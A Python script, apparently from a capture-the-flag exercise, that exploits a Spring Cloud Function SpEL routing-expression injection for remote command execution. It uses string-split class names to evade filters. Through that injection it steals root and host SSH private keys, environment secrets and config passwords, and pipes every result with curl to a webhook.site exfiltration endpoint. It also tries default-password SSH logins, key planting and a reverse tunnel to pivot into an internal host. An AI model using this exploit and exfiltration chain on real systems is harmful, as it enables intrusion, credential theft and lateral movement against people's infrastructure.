#!/usr/bin/env python3
"""
CTF Chile - Pivot SSH al servidor interno
Usa el RCE para conseguir acceso SSH a 10.160.209.1
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

print("🔐 SSH PIVOT - ACCESO AL SERVIDOR INTERNO")
print("=" * 50)

# Crear webhook
print("[1/7] Preparando canal de exfiltración...")
r = requests.post("https://webhook.site/token", timeout=10)
UUID = r.json()["uuid"]
WH = f"https://webhook.site/{UUID}"
print(f"    ✓ Webhook: https://webhook.site/#!/{UUID}")

def execute_rce(cmd, desc=""):
    payload = (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + cmd.replace('"', '\\"') + '"}'
        ').waitFor()'
    )
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        if desc:
            print(f"    ✓ {desc}")
        return True
    except:
        if desc:
            print(f"    ✗ {desc}")
        return False

print("\n[2/7] Buscando claves SSH existentes...")
ssh_key_commands = [
    ("find /root -name 'id_*' -o -name '*.pem' -o -name 'authorized_keys' 2>/dev/null | xargs ls -la", "Claves SSH root"),
    ("find /home -name '.ssh' 2>/dev/null | xargs ls -laR", "Directorios SSH usuarios"),
    ("cat /root/.ssh/id_rsa 2>/dev/null", "Clave privada RSA root"),
    ("cat /root/.ssh/id_ecdsa 2>/dev/null", "Clave privada ECDSA root"),
    ("cat /root/.ssh/id_ed25519 2>/dev/null", "Clave privada ED25519 root"),
    ("find / -name 'known_hosts' 2>/dev/null | xargs cat", "Known hosts"),
    ("cat /etc/ssh/ssh_host_*_key 2>/dev/null", "Claves host SSH"),
]

for cmd, desc in ssh_key_commands:
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/ssh_keys_{desc.replace(' ', '_').lower()}"
    execute_rce(full_cmd, desc)
    time.sleep(0.5)

print("\n[3/7] Generando claves SSH nuevas...")
keygen_commands = [
    # Generar clave SSH sin passphrase
    ("ssh-keygen -t rsa -b 2048 -f /tmp/ctf_rsa -N '' -q", "Generar clave RSA"),
    ("cat /tmp/ctf_rsa", "Ver clave privada"),
    ("cat /tmp/ctf_rsa.pub", "Ver clave pública"),

    # Intentar copiar la clave al servidor objetivo
    ("ssh-copy-id -i /tmp/ctf_rsa root@10.160.209.1 2>&1", "Copiar clave a root"),
    ("ssh-copy-id -i /tmp/ctf_rsa admin@10.160.209.1 2>&1", "Copiar clave a admin"),
    ("ssh-copy-id -i /tmp/ctf_rsa ubuntu@10.160.209.1 2>&1", "Copiar clave a ubuntu"),
]

for cmd, desc in keygen_commands:
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/keygen_{desc.replace(' ', '_').lower()}"
    execute_rce(full_cmd, desc)
    time.sleep(1)

print("\n[4/7] Intentando conexiones SSH directas...")
ssh_attempts = [
    # Sin clave (password vacío o sin password)
    ("sshpass -p '' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no root@10.160.209.1 'whoami && pwd && ls -la' 2>&1", "SSH root sin password"),
    ("ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o PasswordAuthentication=no root@10.160.209.1 'whoami' 2>&1", "SSH root sin auth"),

    # Con passwords comunes
    ("sshpass -p 'admin' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no admin@10.160.209.1 'whoami' 2>&1", "SSH admin:admin"),
    ("sshpass -p 'password' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no root@10.160.209.1 'whoami' 2>&1", "SSH root:password"),
    ("sshpass -p 'root' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no root@10.160.209.1 'whoami' 2>&1", "SSH root:root"),
    ("sshpass -p '123456' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no admin@10.160.209.1 'whoami' 2>&1", "SSH admin:123456"),

    # Con clave generada
    ("ssh -i /tmp/ctf_rsa -o ConnectTimeout=5 -o StrictHostKeyChecking=no root@10.160.209.1 'whoami && pwd' 2>&1", "SSH con clave generada"),
]

for cmd, desc in ssh_attempts:
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/ssh_attempt_{desc.replace(' ', '_').replace(':', '_').lower()}"
    execute_rce(full_cmd, desc)
    time.sleep(2)

print("\n[5/7] Buscando credenciales en aplicación...")
cred_search_commands = [
    ("grep -r -i 'ssh' /app/ 2>/dev/null | head -20", "Referencias SSH en app"),
    ("grep -r -i 'password' /app/ 2>/dev/null | head -20", "Passwords en app"),
    ("strings /app/app.jar | grep -iE '(ssh|password|key|secret)' | head -30", "Credenciales en JAR"),
    ("env | grep -iE '(ssh|password|key|secret|auth)' | head -20", "Variables de entorno"),
    ("cat /app/application*.properties 2>/dev/null | grep -iE '(ssh|password|user|auth)'", "Config SSH en properties"),
    ("find /tmp /var/tmp -name '*key*' -o -name '*ssh*' 2>/dev/null | xargs cat", "Archivos temporales"),
]

for cmd, desc in cred_search_commands:
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/creds_{desc.replace(' ', '_').lower()}"
    execute_rce(full_cmd, desc)
    time.sleep(0.5)

print("\n[6/7] Intentando técnicas avanzadas...")
advanced_commands = [
    # Agent forwarding
    ("ssh -A -o ConnectTimeout=5 -o StrictHostKeyChecking=no root@10.160.209.1 'echo SSH_AUTH_SOCK=$SSH_AUTH_SOCK' 2>&1", "SSH Agent Forwarding"),

    # Buscar en procesos
    ("ps aux | grep -i ssh", "Procesos SSH"),

    # Buscar sockets Unix
    ("find /tmp -name '*ssh*' -o -name '*agent*' 2>/dev/null | xargs ls -la", "Sockets SSH"),

    # Intentar sin autenticación
    ("nc -w 3 10.160.209.1 22", "Banner SSH directo"),

    # Buscar en memoria de procesos
    ("cat /proc/*/cmdline 2>/dev/null | tr '\\0' '\\n' | grep -iE '(ssh|password|key)' | head -10", "SSH en procesos"),
]

for cmd, desc in advanced_commands:
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/advanced_{desc.replace(' ', '_').lower()}"
    execute_rce(full_cmd, desc)
    time.sleep(1)

print("\n[7/7] Estableciendo túnel reverso...")
# Si SSH normal no funciona, intentar túnel reverso
tunnel_commands = [
    # Túnel reverso SSH (si tenemos clave)
    ("ssh -i /tmp/ctf_rsa -R 8888:127.0.0.1:22 -o ConnectTimeout=5 root@10.160.209.1 'echo tunnel_established' 2>&1", "Túnel reverso"),

    # Netcat para establecer conexión directa
    ("echo 'nc_test' | nc 10.160.209.1 22 2>&1", "Test netcat SSH"),
]

for cmd, desc in tunnel_commands:
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/tunnel_{desc.replace(' ', '_').lower()}"
    execute_rce(full_cmd, desc)
    time.sleep(2)

print("\n⏳ Esperando resultados (15s)...")
time.sleep(15)

print("\n" + "="*60)
print("🔐 SSH PIVOT COMPLETADO")
print("="*60)
print(f"🔗 Webhook: https://webhook.site/#!/{UUID}")
print("")
print("🎯 BUSCAR ESPECÍFICAMENTE:")
print("   • Claves SSH privadas (-----BEGIN ... KEY-----)")
print("   • Conexiones SSH exitosas (whoami successful)")
print("   • Passwords en archivos de configuración")
print("   • Mensajes de 'Permission granted' o 'Authentication successful'")
print("")
print("✅ SI ENCUENTRAS CLAVE PRIVADA:")
print("   1. Copia la clave a un archivo local")
print("   2. chmod 600 clave_privada")
print("   3. ssh -i clave_privada usuario@10.160.209.1")
print("")
print("🚀 SI SSH FUNCIONA:")
print("   • ssh usuario@10.160.209.1 'find / -name \"*flag*\"'")
print("   • ssh usuario@10.160.209.1 'env | grep -i flag'")
print("="*60)